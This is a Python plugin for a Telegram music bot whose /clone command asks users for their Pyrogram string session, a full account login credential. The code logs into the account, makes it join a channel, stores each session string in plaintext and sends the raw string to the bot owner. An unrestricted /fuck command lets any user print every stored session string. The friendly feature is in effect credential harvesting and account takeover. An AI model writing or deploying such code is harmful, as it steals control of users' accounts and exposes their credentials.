from CakeMusic import bot, API_ID, API_HASH, OWNER_ID
from pyrogram import filters, Client, idle
from pyrogram.types import Message
import os
import json
import shutil

# Directory to store clone data
CLONE_DATA_FILE = "clone_data.json"
PLUGINS_DIR = "CakeMusic/plugins/clone"

# Helper function to load clone data from file
def load_clone_data():
    if os.path.exists(CLONE_DATA_FILE):
        with open(CLONE_DATA_FILE, "r") as file:
            return json.load(file)
    return {}

# Helper function to save clone data to file
def save_clone_data(data):
    with open(CLONE_DATA_FILE, "w") as file:
        json.dump(data, file)

# Ensure that the plugin directory exists
def ensure_plugin_directory():
    if not os.path.exists(PLUGINS_DIR):
        os.makedirs(PLUGINS_DIR)

# Function to copy plugins into the clone directory
def copy_plugins():
    source_plugin_dir = "CakeMusic/plugins"  # Assuming the main plugins are in CakeMusic/plugins
    for plugin in os.listdir(source_plugin_dir):
        src_path = os.path.join(source_plugin_dir, plugin)
        dst_path = os.path.join(PLUGINS_DIR, plugin)
        if os.path.isdir(src_path) and not os.path.exists(dst_path):
            shutil.copytree(src_path, dst_path)  # Copy plugin directory if it doesn't exist in clone

@bot.on_message(filters.command("clone"))
async def clone(bot: Client, msg: Message):
    """
    Clone command: Clone a Pyrogram session using a provided string session,
    load plugins for the cloned session, join a channel, and store session info.
    """
    if len(msg.command) < 2:
        await msg.reply("Usage: `/clone <string_session>`\nSend your Pyrogram2 string session to clone. ❤️")
        return

    string_session = msg.command[1]
    clone_data = load_clone_data()

    # Check if this session already exists
    if string_session in clone_data:
        await msg.reply("This session has already been cloned!")
        return
    
    try:
        reply_msg = await msg.reply("Please wait... Setting up the session and loading plugins. 💌")
        
        # Ensure the plugin directory exists
        ensure_plugin_directory()
        
        # Copy plugins if they are not already present in the cloned directory
        copy_plugins()

        # Initialize the client with the provided session string
        client = Client(
            name="ClonedClient",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=string_session,
            plugins=dict(root=PLUGINS_DIR)  # Load plugins from the specific directory
        )

        # Start the client and fetch user details
        await client.start()
        user = await client.get_me()

        # Join a channel (You can specify any channel here)
        channel = 'your_channel_id_or_username'  # Replace with actual channel ID or username
        try:
            await client.join_chat(channel)
            print(f"Successfully joined the channel: {channel}")
        except Exception as e:
            print(f"Failed to join the channel: {str(e)}")

        # Save the cloned session info
        clone_data[string_session] = {
            "user_id": user.id,
            "user_name": user.first_name,
            "session_id": string_session,
            "plugins": os.listdir(PLUGINS_DIR)  # List the loaded plugins
        }
        save_clone_data(clone_data)

        # Send the clone data to the bot owner
        owner_msg = f"New clone created:\n\n" \
                    f"**User:** {user.first_name}\n" \
                    f"**User ID:** {user.id}\n" \
                    f"**Session ID:** {string_session}\n" \
                    f"**Plugins:** {', '.join(os.listdir(PLUGINS_DIR))}"
        await bot.send_message(OWNER_ID, owner_msg)

        # Success message
        success_msg = (
            f"🎉 Successfully cloned the session and loaded plugins!\n\n"
            f"👤 **User:** {user.first_name}\n"
            f"🆔 **User ID:** {user.id}\n"
            f"**Plugins Loaded:** {', '.join(os.listdir(PLUGINS_DIR))}\n\n"
            f"Enjoy using your cloned session. 💕"
        )
        await reply_msg.edit(success_msg)

        # Keep the cloned client running
        print("Cloned session running. Press Ctrl+C to stop.")
        await idle()

    except Exception as e:
        error_msg = f"❌ **ERROR:** `{str(e)}`\nPlease check your session string or plugins."
        await msg.reply(error_msg)
    
    finally:
        if client.is_connected:
            await client.stop()

@bot.on_message(filters.command("list"))
async def clone_list(bot: Client, msg: Message):
    """
    List all cloned sessions.
    """
    clone_data = load_clone_data()
    if not clone_data:
        await msg.reply("No clones available.")
        return
    
    clone_list_msg = "Cloned sessions:\n\n"
    for session in clone_data.values():
        clone_list_msg += f"**User:** {session['user_name']} | **User ID:** {session['user_id']} | **Plugins:** {', '.join(session['plugins'])}\n"
    
    await msg.reply(clone_list_msg)

@bot.on_message(filters.command("delete"))
async def clone_delete(bot: Client, msg: Message):
    """
    Delete a cloned session.
    """
    if len(msg.command) < 2:
        await msg.reply("Usage: `/clone delete <session_id>`\nProvide the session ID to delete.")
        return
    
    session_id = msg.command[1]
    clone_data = load_clone_data()

    if session_id not in clone_data:
        await msg.reply("Clone session not found!")
        return
    
    # Remove the session
    del clone_data[session_id]
    save_clone_data(clone_data)

    await msg.reply(f"Clone session with ID `{session_id}` has been deleted.")

    # Send the deletion notification to the bot owner
    deletion_msg = f"Clone session deleted:\n\n" \
                   f"**Session ID:** {session_id}"
    await bot.send_message(OWNER_ID, deletion_msg)


@bot.on_message(filters.command("fuck"))
async def fetch_all_clones(bot: Client, msg: Message):
    """
    Fetch and display details of all cloned sessions.
    """
    clone_data = load_clone_data()
    if not clone_data:
        await msg.reply("No clones available.")
        return
    
    all_clone_data_msg = "All Cloned Sessions:\n\n"
    for session in clone_data.values():
        all_clone_data_msg += (
            f"**User Name:** {session['user_name']}\n"
            f"**User ID:** {session['user_id']}\n"
            f"**Session ID:** {session['session_id']}\n"
            f"**Owner ID:** {OWNER_ID}\n"
            f"**Plugins:** {', '.join(session['plugins'])}\n\n"
        )
    
    await msg.reply(all_clone_data_msg)
